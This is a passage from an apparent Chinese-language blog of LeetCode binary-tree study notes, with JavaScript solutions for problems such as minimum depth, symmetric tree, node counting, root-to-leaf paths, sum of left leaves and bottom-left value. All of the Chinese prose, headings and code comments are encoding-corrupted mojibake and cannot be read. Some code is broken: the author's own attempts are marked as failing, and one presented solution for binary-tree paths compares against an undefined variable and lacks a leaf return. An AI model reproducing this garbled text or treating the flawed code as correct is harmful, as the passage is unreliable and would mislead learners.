‘éƒ½ç©ºï¼Œéœ€è¦åšåˆ¤æ–­ã€‚ï¼ˆä¸€æ£µæ ‘åªæœ‰å·¦èŠ‚ç‚¹ï¼Œé‚£å°±é€’å½’å·¦å­æ ‘ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span>(!left) <span class="keyword">return</span> right + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(!right) <span class="keyword">return</span> left + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.min(left, right)+<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-6"><a href="#æ€è·¯2-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> queue = [root];</span><br><span class="line">    <span class="keyword">let</span> dep = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> size = queue.length;</span><br><span class="line">        dep++;</span><br><span class="line">        <span class="keyword">while</span>(size--)&#123;</span><br><span class="line">            <span class="keyword">const</span> node = queue.shift();</span><br><span class="line">            <span class="comment">// åˆ°ç¬¬ä¸€ä¸ªå¶å­èŠ‚ç‚¹ è¿”å› å½“å‰æ·±åº¦ </span></span><br><span class="line">            <span class="keyword">if</span>(!node.left &amp;&amp; !node.right) <span class="keyword">return</span> dep;</span><br><span class="line">            node.left &amp;&amp; queue.push(node.left);</span><br><span class="line">            node.right &amp;&amp; queue.push(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode101â€”â€”å¯¹ç§°äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰"><a href="#LeetCode101â€”â€”å¯¹ç§°äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode101â€”â€”å¯¹ç§°äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰"></a>LeetCode101â€”â€”å¯¹ç§°äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/symmetric-tree/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -5"><a href="#è‡ªå·±çš„ä»£ç -5" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>ä¸ä¼šåšï¼Œå¦‚æœç¡¬å†™åªä¼šæ ¹æ®æ•°ç»„çš„2çš„næ¬¡æ–¹åˆ†å‰²ç„¶ååˆ¤æ–­æ˜¯ä¸æ˜¯å¯¹ç§°ã€‚æŒ‰å±‚åºéå†ä¹Ÿå¾ˆéš¾åˆ¤æ–­ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-6"><a href="#æ€è·¯1-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>å…¶å®æˆ‘ä»¬è¦æ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªæ ‘ï¼ˆè¿™ä¸¤ä¸ªæ ‘æ˜¯æ ¹èŠ‚ç‚¹çš„å·¦å³å­æ ‘ï¼‰ï¼Œæ‰€ä»¥åœ¨é€’å½’éå†çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿè¦åŒæ—¶éå†ä¸¤æ£µæ ‘ã€‚</p><p><strong>ä¸€ä¸ªæ ‘çš„éå†é¡ºåºæ˜¯å·¦å³ä¸­ï¼Œä¸€ä¸ªæ ‘çš„éå†é¡ºåºæ˜¯å³å·¦ä¸­ã€‚</strong></p><p><img src="https://i.loli.net/2021/07/29/KOA89QFnphP7C6S.png" alt="image.png"></p><p>é€’å½’ä¸‰éƒ¨æ›²</p><ul><li><p>ç¡®å®šé€’å½’å‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼ã€‚å‚æ•°æ˜¯å·¦å­æ ‘èŠ‚ç‚¹å’Œå³å­æ ‘èŠ‚ç‚¹ï¼Œè¿”å›å€¼æ˜¯boolç±»å‹ã€‚</p></li><li><p>ç¡®å®šç»ˆæ­¢æ¡ä»¶ã€‚</p><ul><li>å·¦èŠ‚ç‚¹ä¸ºç©ºï¼Œå³èŠ‚ç‚¹ä¸ä¸ºç©ºï¼Œreturn false</li><li>å·¦ä¸ä¸ºç©ºï¼Œå³ä¸ºç©ºï¼Œ return false</li><li>å·¦å³éƒ½ä¸ºç©ºï¼Œreturn true</li></ul><p>æ­¤æ—¶å·²ç»æ’é™¤æ‰äº†èŠ‚ç‚¹ä¸ºç©ºçš„æƒ…å†µï¼Œé‚£ä¹ˆå‰©ä¸‹çš„å°±æ˜¯å·¦å³èŠ‚ç‚¹ä¸ä¸ºç©ºï¼š</p><ul><li>å·¦å³éƒ½ä¸ä¸ºç©ºï¼Œæ¯”è¾ƒèŠ‚ç‚¹æ•°å€¼ï¼Œä¸ç›¸åŒ return false</li><li>å¦åˆ™ return true</li></ul></li><li><p>ç¡®å®šå•å±‚é€’å½’çš„é€»è¾‘ã€‚å•å±‚é€’å½’çš„é€»è¾‘å°±æ˜¯å¤„ç† å³èŠ‚ç‚¹éƒ½ä¸ä¸ºç©ºï¼Œä¸”æ•°å€¼ç›¸åŒçš„æƒ…å†µã€‚</p><ul><li>æ¯”è¾ƒäºŒå‰æ ‘å¤–ä¾§æ˜¯å¦å¯¹ç§°ï¼šä¼ å…¥çš„æ˜¯å·¦èŠ‚ç‚¹çš„å·¦å­©å­ï¼Œå³èŠ‚ç‚¹çš„å³å­©å­ã€‚</li><li>æ¯”è¾ƒå†…ä¾§æ˜¯å¦å¯¹ç§°ï¼Œä¼ å…¥å·¦èŠ‚ç‚¹çš„å³å­©å­ï¼Œå³èŠ‚ç‚¹çš„å·¦å­©å­ã€‚</li><li>å¦‚æœå·¦å³éƒ½å¯¹ç§°å°±è¿”å›true ï¼Œæœ‰ä¸€ä¾§ä¸å¯¹ç§°å°±è¿”å›false ã€‚</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isSymmetric = <span class="function"><span class="keyword">function</span> (<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">const</span> compareNode = <span class="function"><span class="keyword">function</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//2. ç¡®å®šç»ˆæ­¢æ¡ä»¶ æ³¨æ„valç›¸ç­‰ä¸æ˜¯ç»ˆæ­¢æ¡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span>(left === <span class="literal">null</span> &amp;&amp; right !== <span class="literal">null</span> || left !== <span class="literal">null</span> &amp;&amp; right === <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left === <span class="literal">null</span> &amp;&amp; right === <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left.val !== right.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.ç¡®å®šå•å±‚é€’å½’é€»è¾‘</span></span><br><span class="line">        <span class="keyword">let</span> outSide = compareNode(left.left, right.right);</span><br><span class="line">        <span class="keyword">let</span> inSide = compareNode(left.right, right.left);</span><br><span class="line">        <span class="keyword">return</span> outSide &amp;&amp; inSide;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> compareNode(root.left, root.right);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-7"><a href="#æ€è·¯2-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼š</p><p>ä½¿ç”¨é˜Ÿåˆ—æ¥æ¯”è¾ƒä¸¤ä¸ªæ ‘ï¼ˆæ ¹èŠ‚ç‚¹çš„å·¦å³å­æ ‘ï¼‰æ˜¯å¦ç›¸äº’ç¿»è½¬ã€‚æ‰‹åŠ¨å°†å¯¹ç§°çš„èŠ‚ç‚¹æŒ‰é¡ºåºå…¥é˜Ÿï¼Œç„¶åæ¯”è¾ƒå‰ä¸¤ä¸ªæ˜¯å¦ç›¸ç­‰ã€‚</p><p>ï¼ˆä½¿ç”¨æ ˆä¹Ÿå¯ï¼Œåªéœ€æŠŠ shift æ”¹æˆ pop ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isSymmetric = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">   <span class="comment">//è¿­ä»£æ–¹æ³•åˆ¤æ–­æ˜¯å¦æ˜¯å¯¹ç§°äºŒå‰æ ‘</span></span><br><span class="line">   <span class="comment">//é¦–å…ˆåˆ¤æ–­rootæ˜¯å¦ä¸ºç©º</span></span><br><span class="line">   <span class="keyword">if</span>(root===<span class="literal">null</span>)&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">let</span> queue=[];</span><br><span class="line">   queue.push(root.left);</span><br><span class="line">   queue.push(root.right);</span><br><span class="line">   <span class="keyword">while</span>(queue.length)&#123;</span><br><span class="line">       <span class="keyword">let</span> leftNode=queue.shift();<span class="comment">//å·¦èŠ‚ç‚¹</span></span><br><span class="line">       <span class="keyword">let</span> rightNode=queue.shift();<span class="comment">//å³èŠ‚ç‚¹</span></span><br><span class="line">       <span class="keyword">if</span>(leftNode===<span class="literal">null</span>&amp;&amp;rightNode===<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(leftNode===<span class="literal">null</span>||rightNode===<span class="literal">null</span>||leftNode.val!==rightNode.val)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       queue.push(leftNode.left);<span class="comment">//å·¦èŠ‚ç‚¹å·¦å­©å­å…¥é˜Ÿ</span></span><br><span class="line">       queue.push(rightNode.right);<span class="comment">//å³èŠ‚ç‚¹å³å­©å­å…¥é˜Ÿ</span></span><br><span class="line">       queue.push(leftNode.right);<span class="comment">//å·¦èŠ‚ç‚¹å³å­©å­å…¥é˜Ÿ</span></span><br><span class="line">       queue.push(rightNode.left);<span class="comment">//å³èŠ‚ç‚¹å·¦å­©å­å…¥é˜Ÿ</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode222â€”â€”å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode222â€”â€”å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode222â€”â€”å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode222â€”â€”å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°ï¼ˆâ˜†â˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -6"><a href="#è‡ªå·±çš„ä»£ç -6" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>å¥—ç”¨è¿­ä»£ç‰ˆå±‚åºéå†æ¨¡æ¿ï¼Œæ¯”è¾ƒå®¹æ˜“ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countNodes = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> queue = [], count = <span class="number">0</span>;;</span><br><span class="line">    queue.push(root);</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="keyword">let</span> length = queue.length;</span><br><span class="line">        <span class="comment">// å…¶å® while(length--) å°±å¥½</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">            <span class="keyword">let</span> node = queue.shift();</span><br><span class="line">            count++;</span><br><span class="line">            node.left &amp;&amp; queue.push(node.left);</span><br><span class="line">            node.right &amp;&amp; queue.push(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯-amp-é¢˜è§£-1"><a href="#æ€è·¯-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>è¿˜å¯ä»¥é€’å½’ï¼ˆåœ¨å†…éƒ¨å†™ä¸€ä¸ªé€’å½’å‡½æ•°ï¼‰ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countNodes = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 1. ç¡®å®šé€’å½’å‡½æ•°å‚æ•°</span></span><br><span class="line">    <span class="keyword">const</span> getNodeSum=<span class="function"><span class="keyword">function</span>(<span class="params">node</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 2. ç¡®å®šç»ˆæ­¢æ¡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span>(node===<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 3. ç¡®å®šå•å±‚é€’å½’é€»è¾‘</span></span><br><span class="line">        <span class="keyword">let</span> leftNum=getNodeSum(node.left);</span><br><span class="line">        <span class="keyword">let</span> rightNum=getNodeSum(node.right);</span><br><span class="line">        <span class="keyword">return</span> leftNum+rightNum+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getNodeSum(root);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode257â€”â€”äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„ï¼ˆâ˜†ï¼‰"><a href="#LeetCode257â€”â€”äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode257â€”â€”äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„ï¼ˆâ˜†ï¼‰"></a>LeetCode257â€”â€”äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-paths/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -7"><a href="#è‡ªå·±çš„ä»£ç -7" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>ä¸ä¼šï¼Œä¸çŸ¥é“å¦‚ä½•ç”¨é€’å½’è¡¨ç¤ºã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-2"><a href="#æ€è·¯-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> binaryTreePaths = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [];</span><br><span class="line">    <span class="comment">// 1.ç¡®å®šé€’å½’å‡½æ•°ã€å‚æ•°</span></span><br><span class="line">    <span class="keyword">const</span> getPath = <span class="function"><span class="keyword">function</span> (<span class="params">node, curPath</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 2.ç¡®å®šç»ˆæ­¢æ¡ä»¶, åˆ°å¶å­ç»“ç‚¹ç»ˆæ­¢</span></span><br><span class="line">        <span class="keyword">if</span> (node.left === <span class="literal">null</span> &amp;&amp; node.right === right) &#123;</span><br><span class="line">            curPath += node.val;</span><br><span class="line">            res.push(curPath);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.å•å±‚é€’å½’ é€»è¾‘</span></span><br><span class="line">        curPath += node.val + <span class="string">&#x27;-&gt;&#x27;</span>;</span><br><span class="line">        node.left &amp;&amp; getPath(node.left, curPath);</span><br><span class="line">        node.right &amp;&amp; getPath(node.right, curPath);</span><br><span class="line">    &#125;</span><br><span class="line">    getPath(root, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬äºŒç§éå†æ–¹æ³• ï¼ˆæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå³é€’å½’ï¼‰</span></span><br><span class="line"><span class="keyword">var</span> binaryTreePaths = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> paths = [];</span><br><span class="line">    <span class="keyword">const</span> construct_paths = <span class="function">(<span class="params">root, path</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root) &#123;</span><br><span class="line">            path += root.val.toString();</span><br><span class="line">            <span class="keyword">if</span> (root.left === <span class="literal">null</span> &amp;&amp; root.right === <span class="literal">null</span>) &#123; </span><br><span class="line">                paths.push(path); </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                path += <span class="string">&quot;-&gt;&quot;</span>; </span><br><span class="line">                construct_paths(root.left, path);</span><br><span class="line">                construct_paths(root.right, path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    construct_paths(root, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> paths;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰è¿™æ ·çš„å†™æ³•æ‰æ˜¯çœŸæ­£æŒæ¡äº†é€’å½’çš„ç”¨æ³•ï¼Œå¥½åƒäºŒå‰æ ‘çš„é¢˜éƒ½èƒ½ç”¨é€’å½’æ¥å†™ã€‚</p><h2 id="LeetCode404â€”â€”å·¦å¶å­ä¹‹å’Œï¼ˆâ˜†ï¼‰"><a href="#LeetCode404â€”â€”å·¦å¶å­ä¹‹å’Œï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode404â€”â€”å·¦å¶å­ä¹‹å’Œï¼ˆâ˜†ï¼‰"></a>LeetCode404â€”â€”å·¦å¶å­ä¹‹å’Œï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/sum-of-left-leaves/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -8"><a href="#è‡ªå·±çš„ä»£ç -8" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sumOfLeftLeaves = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> getLeft=<span class="function"><span class="keyword">function</span>(<span class="params">node</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (node.left === <span class="literal">null</span> &amp;&amp; node.right === <span class="literal">null</span> ) &#123;</span><br><span class="line">            count += node.val;</span><br><span class="line">        &#125;</span><br><span class="line">        node.left &amp;&amp; getLeft(node.left);</span><br><span class="line">        node.right &amp;&amp; node.right.left &amp;&amp; getLeft(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">    getLeft(root);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰è¿‡ï¼Œè¿™é‡Œå¿½ç•¥äº† root ä¸º [1] çš„æƒ…å†µï¼Œä½†æ˜¯æƒ³ä¸åˆ°å¦‚ä½•åˆ—å‡ºè¿™ç§æƒ…å†µã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-3"><a href="#æ€è·¯-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>é€šè¿‡é»˜è®¤ä¼ å‚çš„æ–¹å¼æ ‡è®°é€’å½’çš„æ˜¯å·¦å­æ ‘è¿˜æ˜¯å³å­æ ‘ï¼Œæ ¹èŠ‚ç‚¹é»˜è®¤falseã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sumOfLeftLeaves = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> getLeft=<span class="function"><span class="keyword">function</span>(<span class="params">node, isLeft = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// æ˜¯å·¦å¶å­ç»“ç‚¹å†è®¡ç®—æ€»å’Œ</span></span><br><span class="line">        <span class="keyword">if</span> (isLeft &amp;&amp; !node.left&amp;&amp; !node.right) &#123;</span><br><span class="line">            count += node.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å·¦å­æ ‘é€’å½’ä¼ å…¥trueï¼Œå³å­æ ‘ä¼ å…¥false</span></span><br><span class="line">        node.left &amp;&amp; getLeft(node.left, <span class="literal">true</span>);</span><br><span class="line">        node.right &amp;&amp; getLeft(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">    getLeft(root);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode513â€”â€”æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode513â€”â€”æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode513â€”â€”æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode513â€”â€”æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/find-bottom-left-tree-value/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -9"><a href="#è‡ªå·±çš„ä»£ç -9" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findBottomLeftValue = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [], queue = [], result=[];</span><br><span class="line">    queue.push(root);</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">while</span> (queue.length!= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> length = queue.length;</span><br><span class="line">        <span class="keyword">let</span> curList = [];</span><br><span class="line">        <span class="keyword">while</span> (length--) &#123;</span><br><span class="line">            <span class="keyword">let</span> curNode = queue.shift();</span><br><span class="line">            curList.push(curNode);</span><br><span class="line">            curNode.left &amp;&amp; queue.push(curNode.left);</span><br><span class="line">            curNode.right &amp;&amp; queue.push(curNode.right);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push(curList);</span><br><span class="line">    &#125;</span><br><span class="line">    result = res[res.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰è¿‡ï¼Œæƒ³æ³•å¾ˆç®€å•ï¼Œå°±æ˜¯å±‚åºéå†å return resæœ€åä¸€å±‚çš„é¦–ä½ï¼Œä½†æ˜¯æœ€åç»“æœæ˜¯NaNï¼Œåº”è¯¥æ˜¯å“ªæ•°æ®ç±»å‹é”™äº†ã€‚ï¼ˆäºŒå‰æ ‘æ— æ³•è°ƒè¯•=ï¼‰</p><h3 id="æ€è·¯1-amp-é¢˜è§£-7"><a href="#æ€è·¯1-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>è¿˜æ˜¯è¿­ä»£ï¼Œåªæ˜¯ä¸éœ€è¦å€ŸåŠ©æ•°ç»„ï¼Œåˆ©ç”¨ resNode ï¼Œä¸€ç›´è¦†ç›–ï¼Œç›´åˆ°éå†æœ€åº•å±‚çš„ curNode.val ï¼Œæœ€å return ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findBottomLeftValue = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> queue = [], resNode;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    queue.push(root);</span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="keyword">let</span> length = queue.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">            <span class="keyword">let</span> curNode = queue.shift();</span><br><span class="line">            <span class="keyword">if</span> (i === <span class="number">0</span>) &#123;</span><br><span class="line">                resNode = curNode.val;</span><br><span class="line">            &#125;</span><br><span class="line">            curNode.left &amp;&amp; queue.push(curNode.left);</span><br><span class="line">            curNode.right &amp;&amp; queue.push(curNode.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resNode</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-8"><a href="#æ€è·¯2-amp-é¢˜è§£-8" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>é€’å½’æ¯”è¾ƒæ·±åº¦ï¼Œæœ€æ·±çš„ç¬¬ä¸€ä¸ªå°±æ˜¯ï¼š(æœ€åº•å±‚æœ€å·¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å³å­æ ‘çš„å³å­æ ‘)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findBottomLeftValue = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// é€’å½’ï¼Œæ‰¾å‰åºéå†ä¸­æœ€å¤§æ·±åº¦çš„å¶å­ç»“ç‚¹</span></span><br><span class="line">    <span class="keyword">let</span> maxPath = <span class="number">0</span>, resNode = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">const</span> dfsTree = <span class="function"><span class="keyword">function</span> (<span class="params">node, curPath</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 2.ç¡®å®šç»ˆæ­¢æ¡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> (!node.left &amp;&amp; !node.right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curPath &gt; maxPath) &#123;</span><br><span class="line">                maxPath = curPath;</span><br><span class="line">                resNode = node.val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.å•å±‚é€’å½’é€»è¾‘</span></span><br><span class="line">        node.left &amp;&amp; dfsTree(node.left, curPath + <span class="number">1</span>);</span><br><span class="line">        node.right &amp;&amp; dfsTree(node.right, curPath + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dfsTree(root, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> resNode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode112â€”â€”è·¯å¾„æ€»å’Œï¼ˆâ˜†ï¼‰"><a href="#LeetCode112â€”â€”è·¯å¾„æ€»å’Œï¼ˆâ˜†ï¼‰" class="headerlink" 